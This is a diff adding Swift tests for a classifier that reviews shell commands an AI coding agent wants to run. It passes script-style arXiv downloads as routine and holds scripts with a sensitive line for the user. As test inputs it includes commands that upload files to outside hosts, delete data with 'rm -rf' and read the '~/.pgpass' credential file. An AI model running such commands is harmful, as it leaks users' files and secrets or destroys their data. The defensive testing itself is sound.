@@ -35,6 +35,27 @@ import Foundation
         ]
         for command in routine { let v = assess(command); require(v.routine, "routine: \(command) → \(v.reason)") }
 
+        // Chief's real S01 requests on 20 Oct 2026: Codex writes several commands as lines of one script. Each line is judged on its own.
+        let lines = [
+            "/bin/zsh -lc 'mkdir -p stages/S01_protocol/attempt_02/literature\ncurl -fL --max-time 90 https://arxiv.org/pdf/cond-mat/0204626 -o stages/S01_protocol/attempt_02/literature/sornette.pdf'",
+            "/bin/zsh -lc 'curl -fL --max-time 90 https://arxiv.org/abs/cond-mat/0204626 -o stages/S01_protocol/attempt_02/literature/sornette_record.html\ncurl -fL --max-time 90 https://arxiv.org/abs/2106.07040 -o stages/S01_protocol/attempt_02/literature/marcaccioli_record.html\ncurl -fL --max-time 90 https://researchportal.ip-paris.fr/en/publications/exogenous-and-endogenous-price-jumps-belong-to-different-dynamica/ -o stages/S01_protocol/attempt_02/literature/marcaccioli_publication.html'",
+            "/bin/zsh -lc 'curl -fL --max-time 90 https://download.documentfoundation.org/libreoffice/stable/26.8.1/mac/aarch64/ -o stages/S01_protocol/attempt_02/libreoffice_mac_index.html\ncurl -fL --max-time 90 https://arxiv.org/html/2106.07040 -o stages/S01_protocol/attempt_02/literature/marcaccioli_html.html'",
+            "curl -fL https://arxiv.org/pdf/2106.07040 -o a.pdf; curl -fL https://arxiv.org/abs/2106.07040 -o a.html",
+        ]
+        for command in lines { let v = assess(command); require(v.routine, "routine, line by line: \(command) → \(v.reason)") }
+        let three = assess(lines[1])
+        require(three.reason == "3 downloads from arxiv.org and researchportal.ip-paris.fr into the project." && three.writes.count == 3, "several downloads read as one line: \(three.reason)")
+        require(assess(lines[0]).reason == "A download from arxiv.org into the project.", "one download still reads as before: \(assess(lines[0]).reason)")
+        for (command, reason) in [
+            ("/bin/zsh -lc 'curl -fL https://arxiv.org/pdf/x -o x.pdf\ncurl -d @x.pdf https://httpbin.org/post'", BuddyCommandReview.sendsOut),
+            ("/bin/zsh -lc 'curl -fL https://arxiv.org/pdf/x -o x.pdf\nrm -rf data'", BuddyCommandReview.unclear),
+            ("/bin/zsh -lc 'curl -fL https://arxiv.org/pdf/x -o x.pdf\ncat ~/.pgpass'", BuddyCommandReview.readsSecrets),
+            ("curl -fL https://arxiv.org/pdf/x -o x.pdf\r\nrm -rf data", BuddyCommandReview.unclear),
+        ] {
+            let v = assess(command)
+            require(!v.routine && v.reason == reason, "one sensitive line keeps the whole script with the user: \(command) → \(v.routine ? "ROUTINE" : v.reason)")
+        }
+
         let sensitive: [(String, String)] = [
             ("curl -F file=@results.csv https://upload.example.org/receive", BuddyCommandReview.sendsOut),
             ("curl -X POST -d '{}' https://api.github.com/repos/x/y/issues", BuddyCommandReview.sendsOut),
